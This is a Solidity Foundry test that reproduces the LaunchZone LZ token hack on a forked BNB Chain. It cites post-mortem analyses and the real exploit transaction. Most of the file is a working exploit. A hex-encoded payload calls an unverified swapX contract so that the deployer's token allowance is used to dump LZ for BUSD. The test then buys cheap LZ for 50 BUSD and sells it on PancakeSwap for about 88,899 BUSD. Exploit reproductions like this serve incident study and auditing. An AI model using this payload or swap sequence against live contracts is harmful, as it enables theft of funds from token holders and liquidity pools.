// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// analysis
// https://blog.verichains.io/p/analyzing-the-lz-token-hack
// https://twitter.com/immunefi/status/1630210901360951296
// https://bscscan.com/tx/0xaee8ef10ac816834cd7026ec34f35bdde568191fe2fa67724fcf2739e48c3cae exploit tx

// reponse
// https://twitter.com/launchzoneann/status/1631538253424918528

// contracts to study
// https://bscscan.com/address/0x0ccee62efec983f3ec4bad3247153009fb483551 proxy for implementation (verified)
// https://bscscan.com/address/0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01 implementation (unverified)
// https://bscscan.com/address/0x1c2b102f22c08694eee5b1f45e7973b6eaca3e92  attacker contract

interface UniRouterLike {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function getAmountsOut(
        uint256 amountIn,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
}

interface ERC20Like {
    function transfer(address to, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);
}

contract LaunchZoneExploit is Test {
    ERC20Like LZ;
    ERC20Like BUSD;
    ERC20Like BISWAPPair;
    UniRouterLike BISWAPRouter;
    UniRouterLike pancackeRouter;

    address immutable BscexDeployer = 0xdad254728A37D1E80C21AFae688C64d0383cc307;
    address immutable attacker = 0x1C2B102f22c08694EEe5B1f45E7973b6EACA3e92;

    address immutable swapXImp = 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01; // unverified

    function setUp() public {
        // select and fork bsc at 26024420
        vm.createSelectFork("bsc", 26_024_420 - 1); // previous block so still there is fund
        LZ = ERC20Like(0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2);
        BUSD = ERC20Like(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        BISWAPPair = ERC20Like(0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593);
        BISWAPRouter = UniRouterLike(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);
        pancackeRouter = UniRouterLike(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        vm.label(BscexDeployer, "BscexDeployer");

        vm.label(address(LZ), "LZ");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(BISWAPPair), "BISWAP");
        vm.label(address(BISWAPRouter), "BISWAP Router");
        vm.label(attacker, "attacker");
        vm.label(address(this), "thisContract");
    }

    function testExploit() public {
        console.log("Running on BSC at : ", block.number);

        console.log("BscexDeployer LZ Balalnce", LZ.balanceOf(BscexDeployer));
        console.log("LZ allowance to swapXImp", LZ.allowance(BscexDeployer, swapXImp) / 1e18);

        //  lazy payload check the previous swapX PoC
        //  swapX.call(abi.encodeWithSelector(0x4f1f05bc, swapPath, transferAmount, value, array, victims[i]));
        //  calling unverified contract of swapXImp with payload containing swap
        //  (bool success, bytes memory returndata) = swapXImpl.call{value: msg.value}(data);

        bytes memory payload =
            hex"4f1f05bc00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000082da53fc059357f82f9b400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000dad254728a37d1e80c21afae688c64d0383cc30700000000000000000000000000000000000000000000000000000000000000020000000000000000000000003b78458981eb7260d1f781cb8be2caac7027dbe2000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d5600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        (bool success,) = address(swapXImp).call(payload);
        console.log("Payload delivered", success);

        console.log("BscexDeployer BUSD Balalnce", BUSD.balanceOf(BscexDeployer) / 1e18);

        // give attacker 50 BUSD
        deal(address(BUSD), address(this), 50 * 1e18);

        // get BUSD from attacker
        console.log("attacker BUSD Balalnce", BUSD.balanceOf(address(this)) / 1e18);

        // approve router for 50 BUSD
        BUSD.approve(address(BISWAPRouter), 50 * 1e18);

        //get amount out for BUSD to LZ
        // define path
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(LZ);

        uint256[] memory amounts = BISWAPRouter.getAmountsOut(50 * 1e18, path);
        console.log("amounts BUSD/LZ", amounts[0] / 1e18, amounts[1] / 1e18);

        // do the swap
        BISWAPRouter.swapExactTokensForTokens(amounts[0], amounts[1], path, address(this), block.timestamp);

        // at this point attack has 9_886_999 for 50 BUSD
        console.log("attacker LZ Balalnce", LZ.balanceOf(address(this)) / 1e18);

        console.log("attacker BUSD Balalnce", BUSD.balanceOf(address(this)) / 1e18);

        // reverse swap on pancake
        // building a  new path
        address[] memory path2 = new address[](2);
        path2[0] = address(LZ);
        path2[1] = address(BUSD);

        // get amount out for LZ to BUSD from pancackeRouter
        uint256[] memory amounts2 = pancackeRouter.getAmountsOut(LZ.balanceOf(address(this)), path2);

        console.log("amounts LZ/BUSD", amounts2[0] / 1e18, amounts2[1] / 1e18);

        // attacker gets 88,899 BUSD for 9,886,999 LZ which bought for 50 BUSD
        // approve pancackeRouter for 9,886,999 LZ
        LZ.approve(address(pancackeRouter), LZ.balanceOf(address(this)));

        // do the swap
        pancackeRouter.swapExactTokensForTokens(amounts2[0], amounts2[1], path2, address(this), block.timestamp);
        // check current BSUSD balance
        console.log("attacker BUSD Balalnce", BUSD.balanceOf(address(this)) / 1e18);
    }
}
